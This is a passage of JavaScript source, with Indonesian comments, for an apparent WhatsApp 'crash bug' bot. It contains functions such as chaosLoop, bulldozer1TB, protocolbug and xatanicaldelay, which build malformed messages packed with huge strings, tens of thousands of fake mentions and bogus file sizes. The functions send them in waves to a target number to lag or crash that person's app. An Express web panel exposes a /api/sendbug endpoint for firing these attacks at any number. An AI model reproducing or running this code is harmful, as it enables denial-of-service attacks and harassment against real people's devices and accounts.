      else result += CHAOS_CHARS[Math.floor(Math.random() * CHAOS_CHARS.length)];
      
      if (i % 200 === 0) result += "Mikasa Invis";
    }
    return result;
  };

  // Generator metadata mention ultra-chaos
  const generateChaosMention = (jid) => [
    {
      tag: "chaos_meta",
      attrs: { 
        class: "invisible",
        chaos_level: "MAX" 
      },
      content: Array.from({ length: 100 }, () => ({
        tag: "phantom_target",
        attrs: { jid: `${Math.random().toString().substring(2, 12)}@s.whatsapp.net` },
        content: undefined
      })),
    },
  ];

  // Fungsi pengirim pesan button chaos
  const sendChaosButton = async () => {
    const chaosText = generateChaosString(500000); // 500k karakter chaos
    
    try {
      const message = await generateWAMessageFromContent(
        target,
        {
          buttonsMessage: {
            text: CHAOS_CHARS[0].repeat(1000),
            contentText: "Mikasa Invis",
            footerText: generateChaosString(1000),
            buttons: [
              {
                buttonId: ".chaos-mode",
                buttonText: { 
                  displayText: chaosText 
                },
                type: 1,
              },
              {
                buttonId: ".destroy-mode",
                buttonText: { 
                  displayText: chaosText.substring(0, 50000)
                },
                type: 1,
              }
            ],
            headerType: 1,
            invisibleMeta: true,
          },
        },
        {}
      );

      await Mikasa.relayMessage("status@broadcast", message.message, {
        messageId: message.key.id,
        statusJidList: [target],
        additionalNodes: generateChaosMention(target),
        chaosMode: true
      });

      if (mention) {
        await Mikasa.relayMessage(
          target,
          {
            chaosStatusMention: {
              message: {
                protocolMessage: {
                  key: message.key,
                  type: 99, // Chaos protocol type
                },
              },
            },
          },
          {
            additionalNodes: [
              {
                tag: "chaos_tracker",
                attrs: { 
                  effect: "super_lag",
                  duration: "eternal" 
                },
                content: generateChaosString(5000),
              },
            ],
          }
        );
      }
    } catch (e) {
      console.error(`[Chaos Button Error] ${e.message}`);
    }
  };

  // Fungsi flood dengan efek lag ekstrim
  const sendLagFlood = async (jid, mentionCount) => {
    const chaosTag = generateChaosString(100);
    
    // Buat sections dengan nested structure ekstrim
    const sections = Array.from({ length: mentionCount }, (_, idx) => ({
      title: `Mikasa Invis-${idx}`,
      rows: Array.from({ length: 50 }, (_, rowIdx) => ({
        title: chaosTag,
        description: generateChaosString(500),
        id: `${chaosTag}-${rowIdx}`
      })),
    }));

    // Generate mentionedJids dengan pola khusus
    const mentionedJids = Array.from({ length: mentionCount * 2 }, () => 
      `1${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`
    );

    const content = {
      viewOnceMessageV3: {
        message: {
          listResponseMessage: {
            title: "Mikasa Invis",
            listType: 99, // Chaos list type
            sections,
            contextInfo: {
              mentionedJid: mentionedJids,
              participant: jid,
              forwardingScore: 9999,
              isForwarded: true,
              chaosInfo: {
                chaosLevel: "MAX",
                effectType: "ULTRA_LAG",
                timestamp: Date.now(),
              },
              // Nested context untuk efek rekursif
              nestedContext: Array.from({ length: 5 }, () => ({
                key: generateChaosString(20),
                value: generateChaosString(100)
              }))
            },
            description: generateChaosString(1000),
          },
        },
      },
      contextInfo: {
        channelMessage: true,
        statusAttributionType: 99, 
        nestedData: Array.from({ length: 10 }, (_, i) => ({
          level: i,
          data: generateChaosString(500),
          children: Array.from({ length: 5 }, (_, j) => ({
            subLevel: j,
            subData: generateChaosString(200)
          }))
        }))
      },
    };

    try {
      const msg = await generateWAMessageFromContent(jid, content, {});
      
      await new Promise(resolve => setTimeout(resolve, Math.random() * 10000));
      
      await Mikasa.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: generateChaosMention(jid),
        ultraLagMode: true
      });

      if (mention) {
        await Mikasa.relayMessage(
          jid,
          {
            lagStatusMention: {
              message: {
                protocolMessage: {
                  key: msg.key,
                  type: 99,
                  nestedProtocol: Array.from({ length: 10 }, () => ({
                    type: Math.floor(Math.random() * 100),
                    data: generateChaosString(500)
                  }))
                },
              },
            },
          },
          {
            additionalNodes: [
              {
                tag: "lag_bomb",
                attrs: { 
                  intensity: "MAX",
                  target: "DEVICE" 
                },
                content: generateChaosString(10000),
              },
            ],
          }
        );
      }
    } catch (e) {
      console.error(`[Lag Flood Error] ${e.message}`);
    }
  };

  const chaosLoop = async () => {
    if (Date.now() - startTime >= duration) {
      return console.log(`[Delay Invis] Chaos operation completed after ${count} waves`);
    }

    try {
      // Hitung wave dengan efek eksponensial
      const waveIntensity = Math.min(10 + Math.pow(count, 1.5), 100);
      
      // Jalankan serangan paralel
      await Promise.all([
        sendChaosButton(),
        sendLagFlood(target, 5000 + (count * 100)), // Meningkat setiap wave
        ...Array.from({ length: waveIntensity }, () => sendLagFlood(target, 1000))
      ]);
      
      count++;
      
      // Hitung delay acak dengan pola eksponensial
      const nextDelay = Math.min(300000, Math.pow(count, 3) * 100); // Max 5 menit
      console.log(`[Chaos Wave ${count}] Sent to ${target} | Next in ${Math.round(nextDelay/1000)}s`);
      
      // Tambahkan delay buatan sebelum wave berikutnya
      setTimeout(chaosLoop, nextDelay);
    } catch (e) {
      console.error(`[Chaos Loop Error] ${e.message}`);
      setTimeout(chaosLoop, 30000); // Recovery delay
    }
  };

  chaosLoop();
}

async function bulldozer1TB(Mikasa, target) {
  const SID = "5e03e0&mms3";
  const key = "10000000_2012297619515179_5714769099548640934_n.enc";
  const type = "image/webp";

  const FIVE_GB = 5 * 1024 * 1024 * 1024; // 5gb dalam byte
  const TOTAL_GB = 1024; // Total 1 tera byte
  const ITERATIONS = TOTAL_GB / 5; // 5GB per mili detik 

  for (let i = 0; i < ITERATIONS; i++) {
    const extraPayload = "I Love You Strangers"; 

    const message = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
            fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
            fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
            mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
            mimetype: type,
            directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
            fileLength: { low: 5242880000, high: 0, unsigned: true }, // 5GB
            mediaKeyTimestamp: { low: Date.now() % 2147483647, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 999999,
            },
            stickerSentTs: { low: -10000000, high: 999, unsigned: false },
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            extraPayload, 
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});
    await Mikasa.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });
  }
}

async function Delaytravadex(target) {
            for (let i = 0; i < 20; i++) {
        await Mikasa.relayMessage(target, 
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: 'galaxy_message',
                                paramsJson: `{\"screen_2_OptIn_0\":true,               \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"shibalDex               Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",                      \"screen_1_TextInput_2\":\"Alwaysaqioo@shibal.lol\",                           \"screen_1_TextInput_3\":\"94643116\",                                      \"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(10)}\",             \"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-            Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",                       \"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                version: 3
                            }
                        }
                    }
                }
            }, 
            { participant: { jid: target } }
        );
    }
}

async function XdelayVoltexC(target) {
    if (typeof target !== "string" || !target.includes("@s.whatsapp.net")) {
        console.warn("❌ Target tidak valid:", target);
        return;
    }

    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const radMsg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    // Properti penting tetap sama (dipendekkan di sini)
                    url: "...",
                    mimetype: "video/mp4",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: mentionedList
                    },
                    annotations: [{
                        embeddedContent: {
                            embeddedMusic: {
                                author: "Mɪᴋᴀsᴀ Cʟᴏᴜᴅ" + "ោ៝".repeat(10000),
                                title: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv"
                            }
                        },
                        embeddedAction: true
                    }]
                }
            }
        }
    }, {});

    const radMsg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    // Properti penting tetap sama
                    isAnimated: true,
                    contextInfo: { mentionedJid: mentionedList }
                }
            }
        }
    }, {});

    await Mikasa.relayMessage("status@broadcast", radMsg1.message, {
        messageId: radMsg1.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await Mikasa.relayMessage("status@broadcast", radMsg2.message, {
        messageId: radMsg2.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const comboMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32)
                },
                interactiveResponseMessage: {
                    body: { text: "0@s.whatsapp.net", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "0@s.whatsapp.net",
                        paramsJson: "\u200e".repeat(999999),
                        version: 3
                    },
                    contextInfo: {
                        isForwarded: true,
                        forwardingScore: 9999,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv",
                            newsletterJid: "120363321780343299@newsletter",
                            serverMessageId: 1
                        }
                    }
                }
            }
        }
    }, {});

    await Mikasa.relayMessage("status@broadcast", comboMsg.message, {
        messageId: comboMsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await Mikasa.sendMessage(target, {
        text: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv",
        mentions: mentionedList
    });
}

async function location(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: 'p',
                    degreesLongitude: 'p',
                    caption: "Mikasa",
                    sequenceNumber: '0',
                    jpegThumbnail: '',
                contextInfo: {
                    mentionedJid: Array.from({
                        length: 30000
                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    isSampled: true,
                    participant: target,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                }
            }
        }
    }
};

const msg = generateWAMessageFromContent(target, generateMessage, {});

await Mikasa.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
}

async function protocolbug(Mikasa, target, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( # )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

await Mikasa.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await Mikasa.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv" },
content: undefined
}
]
}
);
}
}   

async function protocolbug3(Mikasa, target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "鈳� 饾悈 饾悽蜏廷蜖虌汀汀谈谭谭谭蜏廷 饾悕 饾悎 饾悧蜏廷-鈥�",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "Mɪᴋᴀsᴀ Cʟᴏᴜᴅ" + "貍賳貎貏俳貍賳貎".repeat(100),
                                    title: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await Mikasa.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Mikasa.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function xatanicaldelay(Mikasa, target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Mikasa.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Mikasa.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: " Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function shibalProtocol(target, mention) {
                const sex = Array.from({ length: 9741 }, (_, r) => ({
                       title: "꧀".repeat(9741),
                           rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                             }));
                             
                             const MSG = {
                             viewOnceMessage: {
                             message: {
                             listResponseMessage: {
                             title: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv",
                             listType: 2,
                             buttonText: null,
                             sections: sex,
                             singleSelectReply: { selectedRowId: "🇷🇺" },
                             contextInfo: {
                             mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                             participant: target,
                             remoteJid: "status@broadcast",
                             forwardingScore: 9741,
                             isForwarded: true,
                             forwardedNewsletterMessageInfo: {
                             newsletterJid: "9741@newsletter",
                             serverMessageId: 1,
                             newsletterName: "-"
                             }
                             },
                             description: "🇷🇺"
                             }
                             }
                             },
                             contextInfo: {
                             channelMessage: true,
                             statusAttributionType: 2
                             }
                             };

                             const msg = generateWAMessageFromContent(target, MSG, {});

                             await Mikasa.relayMessage("status@broadcast", msg.message, {
                             messageId: msg.key.id,
                             statusJidList: [target],
                             additionalNodes: [
                             {
                             tag: "meta",
                             attrs: {},
                             content: [
                             {
                             tag: "mentioned_users",
                             attrs: {},
                             content: [
                             {
                             tag: "to",
                             attrs: { jid: target },
                             content: undefined
                             }
                             ]
                             }
                             ]
                             }
                             ]
                             });

                             if (mention) {
                             await Mikasa.relayMessage(
                             target,
                             {
                             statusMentionMessage: {
                             message: {
                             protocolMessage: {
                             key: msg.key,
                             type: 25
                             }
                             }
                             }
                             },
                             {
                additionalNodes: [
                    {
                       tag: "meta",
                           attrs: { is_status_mention: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv ▾" },
                             content: undefined
}
]
}
);
}
};

async function xatanicaldelayv2(target, mention) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Mikasa.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

///////////////////////




const app = express();
const WEB_PANEL_PORT = 3000; // Anda bisa ubah port ini sesuai keinginan

// Middleware untuk mengizinkan CORS (penting jika frontend dan backend di domain/port berbeda)
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*'); // Sesuaikan dengan domain frontend Anda di produksi
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    next();
});

app.use(bodyParser.json());
app.use(express.static('public')); // Menyajikan file statis dari folder 'public'

// --- Rute API untuk Frontend ---

// Rute untuk mendapatkan status bot dan sistem
app.get('/api/status', (req, res) => {
    res.json({
        whatsappConnected: isWhatsAppConnected,
        linkedNumber: linkedWhatsAppNumber,
        platform: os.platform(),
        cpu: os.cpus()[0].model,
        hostname: os.hostname(),
        uptimeBot: getUptime(), // Fungsi getUptime() sudah ada di index.js Anda
        uptimeProcess: new Date(process.uptime() * 1000).toISOString().substr(11, 8),
        premiumUsersCount: premiumUsers.length, // Menambahkan info jumlah premium
        adminUsersCount: adminUsers.length // Menambahkan info jumlah admin
    });
});

// Rute untuk addpairing
app.post('/api/addpairing', async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
        return res.status(400).json({ success: false, message: 'Nomor telepon wajib diisi.' });
    }

    if (!isOwner(req.ip)) { // Menggunakan IP sebagai placeholder untuk validasi owner dari web
        return res.status(403).json({ success: false, message: 'Akses ditolak. Hanya owner yang bisa melakukan ini.' });
    }

    if (Mikasa && Mikasa.user) {
        return res.json({ success: false, message: "WhatsApp sudah terhubung." });
    }

    try {
        const code = await Mikasa.requestPairingCode(phoneNumber, "12345678");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        res.json({ success: true, code: formattedCode });
    } catch (error) {
        console.error("Gagal melakukan pairing melalui API:", error);
        res.status(500).json({ success: false, message: "Gagal melakukan pairing: " + error.message });
    }
});

// Rute untuk mengirim bug (misal: /api/sendbug/comeon)
app.post('/api/sendbug/:bugType', async (req, res) => {
    const { bugType } = req.params;
    const { targetNumber } = req.body;

    if (!targetNumber) {
        return res.status(400).json({ success: false, message: 'Nomor target wajib diisi.' });
    }

    // Mengambil fungsi bug dari objek global/modul Anda (asumsi fungsi bug tersedia)
    const bugFunction = {
        'comeon': async (target) => { // Contoh implementasi comeon
            console.log(chalk.red.bold(`[API] One Click Crash Sending Bug (comeon) to ${target}`));
            for (let i = 0; i < 10; i++) { // Mengurangi loop agar tidak terlalu lama di API
                await invisslow(22, target);
                await sleep(500);
                await invismed(22, target);
                await sleep(500);
                await invisdur(22, target);
                await sleep(500);
                await noinv(22, target);
                await sleep(500);
            }
            return true;
        },
        'getout': async (target) => {
            console.log(chalk.red.bold(`[API] One Click Crash Sending Bug (getout) to ${target}`));
            for (let i = 0; i < 10; i++) {
                await invisdur(22, target);
                await sleep(500);
                await invismed(22, target);
                await sleep(500);
                await invisslow(22, target);
                await sleep(500);
            }
            return true;
        },
        'loving': async (target) => {
            console.log(chalk.red.bold(`[API] One Click Crash Sending Bug (loving) to ${target}`));
            for (let i = 0; i < 10; i++) {
                await invisdur(22, target);
                await sleep(500);
                await invismed(22, target);
                await sleep(500);
                await invisslow(22, target);
                await sleep(500);
            }
            return true;
        },
        'shibal': async (target) => {
            console.log(chalk.red.bold(`[API] One Click Crash Sending Bug (shibal) to ${target}`));
            for (let i = 0; i < 10; i++) {
                await invisdur(22, target);
                await sleep(500);
                await invismed(22, target);
                await sleep(500);
                await invisslow(22, target);
                await sleep(500);
            }
            return true;
        },
        'exsecute': async (target) => {
            console.log(chalk.red.bold(`[API] One Click Crash Sending Bug (exsecute) to ${target}`));
            for (let i = 0; i < 10; i++) {
                await invisslow(22, target);
                await sleep(500);
                await invismed(22, target);
                await sleep(500);
                await invisdur(22, target);
                await sleep(500);
            }
            return true;
        },
        'crashch': async (target) => { // Perhatikan target ini bisa newsletter JID
            console.log(chalk.red.bold(`[API] One Click Crash Sending Bug (crashch) to ${target}`));
            for (let i = 0; i < 5; i++) { // Mengurangi loop
                await ch(target);
            }
            return true;
        }
    }[bugType];

    if (!bugFunction) {
        return res.status(404).json({ success: false, message: 'Tipe bug tidak ditemukan.' });
    }

    // Validasi koneksi WhatsApp
    if (!isWhatsAppConnected) {
        return res.status(400).json({ success: false, message: "WhatsApp belum terhubung. Harap lakukan pairing terlebih dahulu." });
    }

    let targetJid = targetNumber.replace(/[^0-9]/g, "");
    // Khusus untuk crashch yang bisa ke newsletter
    if (bugType === 'crashch' && targetNumber.includes('@newsletter')) {
        targetJid = targetNumber;
    } else {
        targetJid += "@s.whatsapp.net";
    }

    // Cek cooldown global (jika bukan owner)
    // Untuk API, kita tidak bisa langsung cek owner ID dari ctx.from.id
    // Anda perlu mekanisme otentikasi/otorisasi yang lebih canggih di sini.
    // Sebagai contoh sederhana, kita tidak menerapkan cooldown via API
    // atau asumsikan semua permintaan API berasal dari owner/admin yang sudah terotorisasi.
    // if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) { /* ... */ }

    try {
        await bugFunction(targetJid);
        res.json({ success: true, message: `Bug '${bugType}' berhasil dikirim ke ${targetNumber}.` });
    } catch (error) {
        console.error(`Gagal mengirim bug '${bugType}' melalui API:`, error);
        res.status(500).json({ success: false, message: `Gagal mengirim bug: ${error.message}` });
    }
});

// Rute untuk setjeda
app.post('/api/setjeda', checkOwnerMiddleware, (req, res) => {
    const { duration } = req.body;
    if (!duration) {
        return res.status(400).json({ success: false, message: 'Durasi wajib diisi. Contoh: 60s atau 10m' });
    }

    const seconds = parseCooldownDuration(duration);
    if (seconds === null) {
        return res.status(400).json({ success: false, message: 'Format durasi tidak valid. Gunakan (s=detik, m=menit).' });
    }

    const cooldownData = loadCooldownData();
    cooldownData.defaultCooldown = seconds;
    saveCooldownData(cooldownData);

    const displayTime = seconds >= 60 ? `${Math.floor(seconds / 60)} menit` : `${seconds} detik`;
    res.json({ success: true, message: `Cooldown global diatur ke ${displayTime}` });
});

// Rute untuk addprem
